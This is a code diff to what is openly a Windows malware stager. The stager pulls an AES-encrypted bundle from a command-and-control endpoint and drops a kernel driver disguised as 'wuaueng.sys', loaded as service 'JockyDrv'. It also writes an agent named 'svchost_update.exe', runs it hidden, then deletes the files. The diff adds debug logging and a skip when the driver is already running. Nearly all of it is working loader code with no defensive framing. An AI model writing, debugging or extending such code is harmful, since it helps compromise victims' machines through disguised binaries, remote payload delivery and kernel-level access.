@@ -10,6 +10,7 @@
 #include <wincrypt.h>
 #include <bcrypt.h>
 #include <stdio.h>
+#include <stdarg.h>
 #include <cstdint>
 #include <cstring>
 #include <string>
@@ -165,6 +166,22 @@ static bool LoadDriver(const uint8_t* buf, uint32_t size) {
     GetTempPathA(MAX_PATH, tempDir);
     snprintf(sysPath, MAX_PATH, "%swuaueng.sys", tempDir);
 
+    // If JockyDrv is already running (from a prior stager run), skip reload.
+    SC_HANDLE hScmCheck = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
+    if (hScmCheck) {
+        SC_HANDLE hSvcCheck = OpenServiceA(hScmCheck, "JockyDrv", SERVICE_QUERY_STATUS);
+        if (hSvcCheck) {
+            SERVICE_STATUS ss{};
+            BOOL running = QueryServiceStatus(hSvcCheck, &ss) &&
+                           ss.dwCurrentState == SERVICE_RUNNING;
+            CloseServiceHandle(hSvcCheck);
+            CloseServiceHandle(hScmCheck);
+            if (running) return true;
+        } else {
+            CloseServiceHandle(hScmCheck);
+        }
+    }
+
     HANDLE hFile = CreateFileA(sysPath, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return false;
@@ -198,29 +215,39 @@ static bool LoadDriver(const uint8_t* buf, uint32_t size) {
     return started || err == ERROR_SERVICE_ALREADY_RUNNING;
 }
 
+static FILE* g_log = nullptr;
+static void Log(const char* fmt, ...) {
+    if (!g_log) g_log = fopen("C:\\stager_debug.log", "w");
+    if (!g_log) return;
+    va_list ap; va_start(ap, fmt); vfprintf(g_log, fmt, ap); va_end(ap);
+    fflush(g_log);
+}
+
 int main() {
     HexDecode(AES_KEY_HEX, g_aesKey, 32);
+    Log("stager started\n");
 
     // 1. Fetch base64(AES(bundle)) from C2
     std::string b64body;
-    if (!HttpGet(L"/api/v1/agent/bundle", b64body))
-        return 1;
+    if (!HttpGet(L"/api/v1/agent/bundle", b64body)) { Log("FAIL step 1: HttpGet bundle\n"); return 1; }
+    Log("step 1 OK: %zu bytes\n", b64body.size());
 
     // 2. Base64 decode
     std::vector<uint8_t> encrypted;
-    if (!Base64Decode(b64body, encrypted))
-        return 1;
+    if (!Base64Decode(b64body, encrypted)) { Log("FAIL step 2: Base64Decode\n"); return 1; }
+    Log("step 2 OK: %zu bytes\n", encrypted.size());
 
     // 3. AES-256-CBC decrypt
     std::vector<uint8_t> plain;
-    if (!AesDecrypt(encrypted, plain))
-        return 1;
+    if (!AesDecrypt(encrypted, plain)) { Log("FAIL step 3: AesDecrypt\n"); return 1; }
+    Log("step 3 OK: %zu bytes\n", plain.size());
 
     // 4. Validate header
-    if (plain.size() < sizeof(BundleHeader)) return 1;
+    if (plain.size() < sizeof(BundleHeader)) { Log("FAIL step 4: too small\n"); return 1; }
     BundleHeader* hdr = reinterpret_cast<BundleHeader*>(plain.data());
-    if (memcmp(hdr->magic, "JCKY", 4) != 0) return 1;
-    if (hdr->version != 0x01) return 1;
+    if (memcmp(hdr->magic, "JCKY", 4) != 0) { Log("FAIL step 4: bad magic\n"); return 1; }
+    if (hdr->version != 0x01) { Log("FAIL step 4: bad version\n"); return 1; }
+    Log("step 4 OK: %u files\n", hdr->num_files);
 
     // 5. Walk file table
     BundleEntry* table = reinterpret_cast<BundleEntry*>(
@@ -230,7 +257,7 @@ int main() {
     uint8_t* agentBuf  = nullptr; uint32_t agentSize  = 0;
 
     for (uint8_t i = 0; i < hdr->num_files; i++) {
-        if (table[i].offset + table[i].size > plain.size()) return 1; // bounds check
+        if (table[i].offset + table[i].size > plain.size()) { Log("FAIL step 5: bounds\n"); return 1; }
         if (table[i].file_type == TYPE_DRIVER) {
             driverBuf  = plain.data() + table[i].offset;
             driverSize = table[i].size;
@@ -240,40 +267,41 @@ int main() {
         }
     }
 
-    if (!driverBuf || !agentBuf) return 1;
+    if (!driverBuf || !agentBuf) { Log("FAIL step 5: missing driver=%d agent=%d\n", !!driverBuf, !!agentBuf); return 1; }
+    Log("step 5 OK: driver=%u bytes agent=%u bytes\n", driverSize, agentSize);
 
     // 6. Load driver — write, SCM start, delete immediately after StartService
-    if (!LoadDriver(driverBuf, driverSize))
-        return 1;
+    if (!LoadDriver(driverBuf, driverSize)) { Log("FAIL step 6: LoadDriver err=%lu\n", GetLastError()); return 1; }
+    Log("step 6 OK: driver loaded\n");
 
     // 7. Write agent to %TEMP%, launch it, delete the file.
-    //    The Windows loader maps the image into the new process before we delete —
-    //    ~100ms is more than enough, but we wait for the process handle to be valid.
     char tempDir[MAX_PATH], agentPath[MAX_PATH];
     GetTempPathA(MAX_PATH, tempDir);
     snprintf(agentPath, MAX_PATH, "%ssvchost_update.exe", tempDir);
 
     HANDLE hf = CreateFileA(agentPath, GENERIC_WRITE, 0, NULL,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hf == INVALID_HANDLE_VALUE) return 1;
+    if (hf == INVALID_HANDLE_VALUE) { Log("FAIL step 7: CreateFile err=%lu\n", GetLastError()); return 1; }
     DWORD written = 0;
     WriteFile(hf, agentBuf, agentSize, &written, NULL);
     CloseHandle(hf);
-    if (written != agentSize) { DeleteFileA(agentPath); return 1; }
+    if (written != agentSize) { Log("FAIL step 7: write %lu/%u\n", written, agentSize); DeleteFileA(agentPath); return 1; }
 
     STARTUPINFOA si = {0}; si.cb = sizeof(si);
     PROCESS_INFORMATION pi = {0};
     if (!CreateProcessA(agentPath, NULL, NULL, NULL, FALSE,
                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        Log("FAIL step 7: CreateProcess err=%lu\n", GetLastError());
         DeleteFileA(agentPath);
         return 1;
     }
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
+    Log("step 7 OK: agent launched PID=%lu\n", pi.dwProcessId);
 
-    // Give the loader time to map the image (~100ms headroom).
     Sleep(150);
     DeleteFileA(agentPath);
-
+    Log("done\n");
+    if (g_log) fclose(g_log);
     return 0;
 }
